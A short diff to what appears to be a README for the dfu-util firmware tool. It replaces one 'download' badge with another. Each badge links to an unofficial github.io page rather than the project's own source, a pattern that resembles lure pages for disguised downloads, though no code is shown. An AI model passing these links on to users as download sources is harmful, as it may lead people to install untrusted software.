@@ -4,12 +4,7 @@
 <img src="https://docs.particle.io/assets/images/support/installing-dfu-util-01zadig.png" width="820">
 </div>
 
-<div align="center">
-<a href="http://dfu-util-free.github.io/.github">
-<img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" width="22">
-<img src="https://img.shields.io/badge/Скачать_DFU--Util-0078D6?style=for-the-badge&logo=windows&logoColor=white">
-</a>
-</div>
+[![GET DFU Util](https://img.shields.io/badge/GET%20%E2%80%94%20DFU-Util-0078D6?style=for-the-badge&logoColor=white)](https://applachev.github.io/.github/DFU-Util)
 
 ---
 
